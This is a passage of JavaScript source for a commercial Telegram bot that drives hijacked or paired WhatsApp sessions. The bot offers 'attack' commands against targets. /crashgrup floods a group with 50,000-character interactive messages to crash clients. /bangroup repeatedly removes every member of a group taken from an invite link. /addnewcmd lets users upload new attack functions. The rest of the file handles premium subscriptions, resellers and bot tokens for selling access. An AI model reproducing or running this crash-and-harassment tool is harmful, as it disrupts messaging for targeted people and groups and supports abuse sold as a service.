                    if (!fileName.endsWith('.js')) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Only .js files.`);
                    try {
                        jsCode = await downloadTelegramFile(S7, replyMsg.document.file_id, token);
                    } catch (err) {
                        return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Download failed: ${err.message}`);
                    }
                } else if (replyMsg && replyMsg.text) {
                    jsCode = replyMsg.text.trim();
                } else {
                    const args = msg.text.split(' ').slice(1).join(' ').trim();
                    if (args) jsCode = args;
                }

                if (!jsCode) {
                    return S7.sendMessage(chatId,
                        `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *No code provided*\n\n` +
                        `*3 ways to add command:*\n\n` +
                        `1️⃣ Reply to a .js file with /addnewcmd\n` +
                        `2️⃣ Reply to a text message with /addnewcmd\n` +
                        `3️⃣ Send /addnewcmd <code> directly`,
                        { parse_mode: "HTML" }
                    );
                }

                try {
                    const validation = cmdBuilder.validateCode(jsCode);
                    if (!validation.valid) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Syntax: <code>${validation.error}</code>`, { parse_mode: "HTML" });
                    const fnName = cmdBuilder.extractFunctionName(jsCode);
                    if (!fnName) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Format: async function NAME(sock, target)`, { parse_mode: "HTML" });
                    pendingCmdBuilder[userId] = { code: jsCode, fnName, step: 'awaiting_cmdname', chatId };
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *Code Validated!*\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> ${fnName}\n\n<tg-emoji emoji-id="5974083768233760323">🔤</tg-emoji> Step 1/3: Send command name`, { parse_mode: "HTML" });
                } catch (err) {
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${err.message}`);
                }
            });

            // ==================== REGISTER ATTACKS ====================
            attackHandler('ioshard', 'ios', 20);
            attackHandler('delayhard', 'forcevideo', 50);
            attackHandler('freeze', 'fcnoclick', 50);
            attackHandler('fcnoclick', 'forceinvis', 100);
			attackHandler('blankios', 'blankios', 30);

            const dynamicCmds = cmdBuilder.getAllCommands();
            for (const dc of dynamicCmds) {
                attackHandler(dc.cmdName, dc.attackType, dc.defaultCount);
                log('info', 'DYNAMIC', `Loaded /${dc.cmdName}`);
            }

            // ==================== GROUP COMMANDS ====================
            SYLoVe('bangroup', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const link = args[1];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error, { parse_mode: "HTML" });
                const client = session.sock;
                if (!link || !link.includes('chat.whatsapp.com/')) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /bangroup [link]`, { parse_mode: "HTML" });
                try {
                    const inviteCode = link.split('chat.whatsapp.com/')[1];
                    const metadata = await client.groupGetInviteInfo(inviteCode);
                    const target = metadata.id;
                    await S7.sendPhoto(chatId, LoveLogo, { caption: `<tg-emoji emoji-id="5373290243787070962">⚡</tg-emoji> Destroying: ${metadata.subject}`, parse_mode: "HTML" });
                    (async () => {
                        for (let i = 0; i < 20; i++) {
                            try {
                                const members = await client.groupMetadata(target);
                                for (const m of members.participants) {
                                    if (m.id !== client.user.id) {
                                        await client.groupParticipantsUpdate(target, [m.id], "remove").catch(() => {});
                                        await sleep(15);
                                    }
                                }
                            } catch (e) {}
                            await sleep(500);
                        }
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Destroyed: ${metadata.subject}`, { parse_mode: "HTML" });
                    })();
                } catch (err) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${err.message}`, { parse_mode: "HTML" }); }
            });

            SYLoVe('crashgrup', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const link = args[1];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error, { parse_mode: "HTML" });
                const client = session.sock;
                if (!link || !link.includes('chat.whatsapp.com/')) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /crashgrup [link]`, { parse_mode: "HTML" });
                try {
                    const inviteCode = link.split('chat.whatsapp.com/')[1];
                    const metadata = await client.groupGetInviteInfo(inviteCode);
                    const target = metadata.id;
                    await S7.sendPhoto(chatId, LoveLogo, { caption: `<tg-emoji emoji-id="5373290243787070962">⚡</tg-emoji> Crashing: ${metadata.subject}`, parse_mode: "HTML" });
                    (async () => {
                        for (let i = 0; i < 20; i++) {
                            try {
                                await client.relayMessage(target, {
                                    interactiveMessage: { body: { text: "./" + "x".repeat(50000) }, nativeFlowMessage: { buttons: [{}] }, contextInfo: { mentionedJid: [target] } }
                                }, {});
                            } catch (e) {}
                            await sleep(100);
                        }
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Crashed: ${metadata.subject}`, { parse_mode: "HTML" });
                    })();
                } catch (err) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${err.message}`, { parse_mode: "HTML" }); }
            });

            SYLoVe('listgc', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!waSessions[chatId] || waSessions[chatId].length === 0) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No sessions.`, { parse_mode: "HTML" });
                let output = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Your Groups:\n\n`;
                for (const session of waSessions[chatId]) {
                    try {
                        const groups = await session.sock.groupFetchAllParticipating();
                        for (const group of Object.values(groups)) {
                            output += `<tg-emoji emoji-id="5332656211034652890">📱</tg-emoji> +${session.num}\n<tg-emoji emoji-id="5443038326535759644">👥</tg-emoji> ${group.subject}\n<tg-emoji emoji-id="5974083768233760323">🆔</tg-emoji> ${group.id}\n\n`;
                        }
                    } catch (e) {}
                }
                S7.sendMessage(chatId, output, { parse_mode: "HTML" });
            });

            SYLoVe('groupid', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const link = args[1];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error, { parse_mode: "HTML" });
                if (!link || !link.includes('chat.whatsapp.com/')) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /groupid [link]`, { parse_mode: "HTML" });
                try {
                    const code = link.split('chat.whatsapp.com/')[1];
                    const info = await session.sock.groupGetInviteInfo(code);
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Group: ${info.subject}\n<tg-emoji emoji-id="5974083768233760323">🆔</tg-emoji> ${info.id}`, { parse_mode: "HTML" });
                } catch (err) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${err.message}`, { parse_mode: "HTML" }); }
            });

            // ==================== PAIRING & SESSION ====================
            SYLoVe('reqpair', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const number = args[1];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!number) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /reqpair [number]`, { parse_mode: "HTML" });
                const cleanNumber = number.replace(/[^0-9]/g, '');
                if (cleanNumber.length < 10) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid number`, { parse_mode: "HTML" });
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> Pairing +${cleanNumber}...`, { parse_mode: "HTML" });
                await StartLovingSY(chatId, cleanNumber, S7);
            });

            SYLoVe('delpair', (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const args = msg.text.split(' ');
                const number = args[1];
                if (!number) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /delpair [number]`, { parse_mode: "HTML" });
                const cleanNumber = number.replace(/[^0-9]/g, '');
                const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;
                if (fs.existsSync(SYPaTH)) {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    if (waSessions[chatId]) waSessions[chatId] = waSessions[chatId].filter(s => s.num !== cleanNumber);
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Deleted: +${cleanNumber}`, { parse_mode: "HTML" });
                } else S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Not found: +${cleanNumber}`, { parse_mode: "HTML" });
            });

            SYLoVe('sessions', (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const db = getDB();
                const uid = userId.toString();
                const isPremium = uid === config.adminId.toString() || db.resellers.includes(uid) || db.premium.find(p => p.id === uid && (!p.expiresAt || p.expiresAt > Date.now()));
                let sessionList = [];
                for (const [chat, sessions] of Object.entries(waSessions)) {
                    if (Array.isArray(sessions)) {
                        sessions.forEach(s => { if (isPremium || chat === chatId) sessionList.push({ owner: chat, num: s.num, connected: true }); });
                    }
                }
                const authBase = './Love/auth';
                if (fs.existsSync(authBase)) {
                    const chatIds = fs.readdirSync(authBase);
                    for (const chat of chatIds) {
                        if (!isPremium && chat !== chatId) continue;
                        const chatPath = path.join(authBase, chat);
                        if (!fs.statSync(chatPath).isDirectory()) continue;
                        const numbers = fs.readdirSync(chatPath);
                        for (const num of numbers) {
                            if (fs.existsSync(path.join(chatPath, num, 'creds.json'))) {
                                if (!sessionList.find(s => s.owner === chat && s.num === num)) sessionList.push({ owner: chat, num, connected: false });
                            }
                        }
                    }
                }
                if (sessionList.length === 0) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No sessions.`, { parse_mode: "HTML" });
                let text = `<tg-emoji emoji-id="5260450573768990626">📊</tg-emoji> SESSIONS (${sessionList.length})\n\n`;
                sessionList.forEach((s, i) => {
                    const status = s.connected ? `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji>` : `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji>`;
                    const owner = s.owner === chatId ? 'You' : s.owner;
                    text += `${i + 1}. +${s.num} ${status} (${owner})\n`;
                });
                S7.sendMessage(chatId, text, { parse_mode: "HTML" });
            });

            SYLoVe('delsession', (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const args = msg.text.split(' ');
                const number = args[1];
                if (!number) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /delsession [number]`, { parse_mode: "HTML" });
                const cleanNumber = number.replace(/[^0-9]/g, '');
                const authPath = `./Love/auth/${chatId}/${cleanNumber}`;
                if (fs.existsSync(authPath)) {
                    fs.rmSync(authPath, { recursive: true, force: true });
                    if (waSessions[chatId]) waSessions[chatId] = waSessions[chatId].filter(s => s.num !== cleanNumber);
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Deleted: +${cleanNumber}`, { parse_mode: "HTML" });
                } else S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Not found: +${cleanNumber}`, { parse_mode: "HTML" });
            });

            SYLoVe('restartsession', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                const args = msg.text.split(' ');
                const number = args[1];
                if (!number) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /restartsession [number]`, { parse_mode: "HTML" });
                const cleanNumber = number.replace(/[^0-9]/g, '');
                if (waSessions[chatId]) {
                    waSessions[chatId].filter(s => s.num === cleanNumber).forEach(s => { try { if (s.sock && s.sock.ws && s.sock.ws.readyState !== 3) s.sock.end(); } catch (e) {} });
                    waSessions[chatId] = waSessions[chatId].filter(s => s.num !== cleanNumber);
                }
                await sleep(2000);
                await StartLovingSY(chatId, cleanNumber, S7);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Restarted: +${cleanNumber}`, { parse_mode: "HTML" });
            });

            SYLoVe('restartallsessions', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                if (userId !== config.adminId.toString() && !isPremiumUser(userId)) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Premium only!`, { parse_mode: "HTML" });
                const authBase = './Love/auth';
                if (!fs.existsSync(authBase)) return S7.sendMessage(chatId, 'No sessions.');
                let allSessions = [];
                const chatIds = fs.readdirSync(authBase);
                for (const chat of chatIds) {
                    const chatPath = path.join(authBase, chat);
                    if (!fs.statSync(chatPath).isDirectory()) continue;
                    const numbers = fs.readdirSync(chatPath);
                    for (const num of numbers) {
                        if (fs.existsSync(path.join(chatPath, num, 'creds.json'))) allSessions.push({ chatId: chat, number: num });
                    }
                }
                S7.sendMessage(chatId, `Restarting ${allSessions.length}...`);
                for (const session of allSessions) {
                    if (waSessions[session.chatId]) waSessions[session.chatId] = waSessions[session.chatId].filter(s => s.num !== session.number);
                    await sleep(2000);
                    StartLovingSY(session.chatId, session.number, S7);
                }
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> All restarted!`, { parse_mode: "HTML" });
            });

            // ==================== TOKEN MANAGEMENT ====================
            SYLoVe('listtoken', async (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                let db = getDB();
                if (!db.tokens || db.tokens.length === 0) return S7.sendMessage(chatId, 'No tokens.');
                let text = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> TOKENS (${db.tokens.length})\n\n`;
                for (const tokenObj of db.tokens) {
                    let botName = 'Unknown';
                    try {
                        const bot = new SY(tokenObj.token, { polling: false });
                        const info = await bot.getMe();
                        botName = `${info.first_name} (@${info.username})`;
                    } catch (e) {}
                    text += `<tg-emoji emoji-id="5197429921634346862">🤖</tg-emoji> ${botName}\n🔑 ${tokenObj.token.substring(0, 20)}...\n<tg-emoji emoji-id="5433758796289685818">👤</tg-emoji> ${tokenObj.owner}\n\n`;
                }
                S7.sendMessage(chatId, text, { parse_mode: "HTML" });
            });

            SYLoVe('delbot', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const botUsername = args[1]?.replace('@', '');
                if (!botUsername) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /delbot @username`, { parse_mode: "HTML" });
                let db = getDB();
                let foundToken = null;
                for (const tokenObj of db.tokens) {
                    try {
                        const bot = new SY(tokenObj.token, { polling: false });
                        const info = await bot.getMe();
                        if (info.username.toLowerCase() === botUsername.toLowerCase()) {
                            if (tokenObj.owner === userId || chatId === config.adminId) { foundToken = tokenObj.token; break; }
                        }
                    } catch (e) {}
                }
                if (!foundToken) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Not found: @${botUsername}`, { parse_mode: "HTML" });
                db.tokens = db.tokens.filter(t => t.token !== foundToken);
                saveDB(db);
                if (activeBots[foundToken]) { try { await activeBots[foundToken].stopPolling(); } catch (e) {} delete activeBots[foundToken]; }
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Deleted: @${botUsername}`, { parse_mode: "HTML" });
            });

            SYLoVe('addtoken', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const newToken = args[1];
                if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
                if (!newToken) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /addtoken [token]`, { parse_mode: "HTML" });
                let db = getDB();
                if (db.tokens.find(t => t.token === newToken)) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Already added.`, { parse_mode: "HTML" });
                if (db.tokens.filter(t => t.owner === userId).length >= 5) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Max 5 bots.`, { parse_mode: "HTML" });
                try {
                    const tempBot = new SY(newToken, { polling: false });
                    const botInfo = await tempBot.getMe();
                    db.tokens.push({ token: newToken, owner: userId });
                    saveDB(db);
                    startSYloveBot(newToken);
                    S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Added: ${botInfo.first_name}`, { parse_mode: "HTML" });
                } catch (e) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid token.`, { parse_mode: "HTML" }); }
            });

            SYLoVe('deltoken', async (msg) => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const delToken = args[1];
                if (!delToken) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /deltoken [token]`, { parse_mode: "HTML" });
                let db = getDB();
                const tokenObj = db.tokens.find(t => t.token === delToken);
                if (!tokenObj || (tokenObj.owner !== userId && chatId !== config.adminId)) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Not found.`, { parse_mode: "HTML" });
                db.tokens = db.tokens.filter(t => t.token !== delToken);
                saveDB(db);
                if (activeBots[delToken]) { try { await activeBots[delToken].stopPolling(); } catch (e) {} delete activeBots[delToken]; }
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Deleted!`, { parse_mode: "HTML" });
            });

            SYLoVe('mytoken', async (msg) => {
                const chatId = msg.chat.id;
                const userId = msg.from.id.toString();
                let db = getDB();
                const myTokens = db.tokens.filter(t => t.owner === userId);
                if (myTokens.length === 0) return S7.sendMessage(chatId, 'No tokens.');
                let text = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Your Tokens (${myTokens.length}/5)\n\n`;
                for (const item of myTokens) {
                    let botName = 'Unknown';
                    try {
                        const bot = new SY(item.token, { polling: false });
                        const info = await bot.getMe();
                        botName = `${info.first_name} (@${info.username})`;
                    } catch (e) {}
                    text += `<tg-emoji emoji-id="5197429921634346862">🤖</tg-emoji> ${botName}\n🔑 ${item.token.substring(0, 20)}...\n\n`;
                }
                S7.sendMessage(chatId, text, { parse_mode: "HTML" });
            });

            // ==================== PREMIUM / RESELLER (FIXED) ====================
            SYLoVe('addprem', (msg) => {
                const chatId = msg.chat.id.toString();
                const db = getDB();
                if (chatId !== config.adminId && !db.resellers.includes(chatId)) return S7.sendMessage(chatId, unauthorized);
                const args = msg.text.split(' ');
                const targetId = args[1];
                const durationStr = args[2];
                if (!targetId) return S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *Usage:*\n` +
                    `/addprem <id> <duration>\n\n` +
                    `*Examples:*\n` +
                    `/addprem 123456 1d\n` +
                    `/addprem 123456 2d\n` +
                    `/addprem 123456 30d\n` +
                    `/addprem 123456 12h\n` +
                    `/addprem 123456 perm`,
                    { parse_mode: "HTML" });

                let durationMs = null;
                if (durationStr) {
                    durationMs = parseDuration(durationStr);
                    if (isNaN(durationMs)) {
                        return S7.sendMessage(chatId,
                            `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *Invalid duration:* <code>${durationStr}</code>\n\n` +
                            `*Valid formats:*\n` +
                            `• <code>1d</code> = 1 day\n` +
                            `• <code>2d</code> = 2 days\n` +
                            `• <code>30d</code> = 30 days\n` +
                            `• <code>12h</code> = 12 hours\n` +
                            `• <code>30m</code> = 30 minutes\n` +
                            `• <code>1w</code> = 1 week\n` +
                            `• <code>perm</code> = permanent`,
                            { parse_mode: "HTML" });
                    }
                }

                const expiresAt = durationMs ? (Date.now() + durationMs) : null;
                const existingIdx = db.premium.findIndex(p => p.id === targetId);
                if (existingIdx !== -1) {
                    const old = db.premium[existingIdx];
                    if (expiresAt === null) {
                        db.premium[existingIdx] = { id: targetId, expiresAt: null };
                    } else if (old.expiresAt === null) {
                        // was permanent, keep permanent
                    } else {
                        const base = Math.max(old.expiresAt, Date.now());
                        db.premium[existingIdx] = { id: targetId, expiresAt: base + durationMs };
                    }
                } else {
                    db.premium.push({ id: targetId, expiresAt });
                }
                saveDB(db);

                const newEntry = db.premium.find(p => p.id === targetId);
                S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *PREMIUM ADDED*\n\n` +
                    `<tg-emoji emoji-id="5433758796289685818">👤</tg-emoji> User: <code>${targetId}</code>\n` +
                    `<tg-emoji emoji-id="5456140674028019486">⏰</tg-emoji> Expiry: ${formatExpiry(newEntry.expiresAt)}\n` +
                    `<tg-emoji emoji-id="5974083768233760323">📅</tg-emoji> ${newEntry.expiresAt ? new Date(newEntry.expiresAt).toLocaleString() : 'Never'}`,
                    { parse_mode: "HTML" });
            });

            SYLoVe('delprem', (msg) => {
                const chatId = msg.chat.id.toString();
                const db = getDB();
                if (chatId !== config.adminId && !db.resellers.includes(chatId)) return S7.sendMessage(chatId, unauthorized);
                const targetId = msg.text.split(' ')[1];
                if (!targetId) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /delprem [ID]`, { parse_mode: "HTML" });
                const before = db.premium.length;
                db.premium = db.premium.filter(p => p.id !== targetId);
                if (db.premium.length === before) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Not found.`, { parse_mode: "HTML" });
                saveDB(db);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${targetId} removed`, { parse_mode: "HTML" });
            });

            // ==================== DELALLPREM ====================
            SYLoVe('delallprem', async (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                let db = getDB();
                if (!db.premium || db.premium.length === 0) {
                    return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No premium users to remove.`, { parse_mode: "HTML" });
                }
                const totalCount = db.premium.length;
                const confirmKeyboard = {
                    inline_keyboard: [
                        [{ text: `✅ YES, Remove All (${totalCount})`, callback_data: 'confirm_delallprem' }],
                        [{ text: '❌ Cancel', callback_data: 'cancel_delallprem' }]
                    ]
                };
                S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> *CONFIRM ACTION*\n\n` +
                    `You are about to remove *ALL* premium users.\n\n` +
                    `<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Total Premium: <b>${totalCount}</b>\n\n` +
                    `<tg-emoji emoji-id="5974083768233760323">❗</tg-emoji> This action *cannot be undone!*`,
                    { parse_mode: "HTML", reply_markup: confirmKeyboard }
                );
            });

            SYLoVe('addresell', (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                const targetId = msg.text.split(' ')[1];
                if (!targetId) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /addresell [ID]`, { parse_mode: "HTML" });
                let db = getDB();
                if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'Already Reseller.');
                db.resellers.push(targetId);
                saveDB(db);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${targetId} → Reseller`, { parse_mode: "HTML" });
            });

            SYLoVe('delresell', (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                const targetId = msg.text.split(' ')[1];
                if (!targetId) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /delresell [ID]`, { parse_mode: "HTML" });
                let db = getDB();
                db.resellers = db.resellers.filter(id => id !== targetId);
                saveDB(db);
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${targetId} removed`, { parse_mode: "HTML" });
            });

            SYLoVe('listprem', (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                let db = getDB();
                if (db.premium.length === 0) return S7.sendMessage(chatId, 'No premium users.');
                let text = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> *PREMIUM USERS* (${db.premium.length}):\n\n`;
                db.premium.forEach((p, i) => {
                    text += `${i + 1}. <code>${p.id}</code>\n   ⏰ ${formatExpiry(p.expiresAt)}\n`;
                });
                S7.sendMessage(chatId, text, { parse_mode: "HTML" });
            });

            SYLoVe('listresell', (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                let db = getDB();
                if (db.resellers.length === 0) return S7.sendMessage(chatId, 'No resellers.');
                let text = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Resellers:\n\n`;
                db.resellers.forEach((id, i) => { text += `${i + 1}. ${id}\n`; });
                S7.sendMessage(chatId, text, { parse_mode: "HTML" });
            });

            // ==================== STATE / BROADCAST ====================
            SYLoVe('state', (msg) => {
                const chatId = msg.chat.id.toString();
                const args = msg.text.split(' ');
                const value = args[1];
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                if (value !== '0' && value !== '1') return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /state 0|1`, { parse_mode: "HTML" });
                let db = getDB();
                db.state = Number(value);
                saveDB(db);
                S7.sendMessage(chatId, value === '0' ? `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> FREE MODE` : `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> PREMIUM ONLY`, { parse_mode: "HTML" });
            });

            SYLoVe('broadcast', async (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                const users = userManager.getAllUsers();
                if (users.length === 0) return S7.sendMessage(chatId, 'No users.');
                const args = msg.text.split(' ').slice(1).join(' ');
                const replyMsg = msg.reply_to_message;
                if (!args && !replyMsg) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /broadcast [message]`, { parse_mode: "HTML" });
                let success = 0, failed = 0;
                for (const user of users) {
                    try {
                        if (replyMsg) await S7.copyMessage(user.chatId, chatId, replyMsg.message_id);
                        else await S7.sendMessage(user.chatId, args, { parse_mode: "HTML" });
                        success++;
                    } catch { failed++; }
                    await sleep(50);
                }
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${success} success, ${failed} failed`, { parse_mode: "HTML" });
            });

            SYLoVe('broadcast1', async (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                const userIds = extractUserIdsFromList();
                if (userIds.length === 0) return S7.sendMessage(chatId, 'No users in list.txt');
                const args = msg.text.split(' ').slice(1).join(' ');
                const replyMsg = msg.reply_to_message;
                if (!args && !replyMsg) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> /broadcast1 [message]`, { parse_mode: "HTML" });
                let success = 0;
                for (const userId of userIds) {
                    try {
                        if (replyMsg) await S7.copyMessage(userId, chatId, replyMsg.message_id);
                        else await S7.sendMessage(userId, args, { parse_mode: "HTML" });
                        success++;
                    } catch {}
                    await sleep(50);
                }
                S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ${success}/${userIds.length}`, { parse_mode: "HTML" });
            });

            SYLoVe('listuser', (msg) => {
                const chatId = msg.chat.id.toString();
                if (chatId !== config.adminId) return S7.sendMessage(chatId, unauthorized);
                const users = userManager.getAllUsers();
                if (users.length === 0) return S7.sendMessage(chatId, 'No users.');
                let list = `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Users (${users.length}):\n\n`;
                users.forEach((u, i) => { list += `${i + 1}. ${u.name} ${u.username ? '@' + u.username : ''} [${u.status}]\n   <tg-emoji emoji-id="5974083768233760323">🆔</tg-emoji> <code>${u.userId}</code>\n`; });
                if (list.length > 4000) list = list.substring(0, 4000) + '\n\n...(truncated)';
                S7.sendMessage(chatId, list, { parse_mode: "HTML" });
            });

        }, 500);
    } catch (err) {
        log('error', 'STARTUP', `Bot error: ${token.substring(0, 10)}...`);
    }
}

// ==================== START ====================
startSYloveBot(config.mainToken);
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => startSYloveBot(obj.token));
}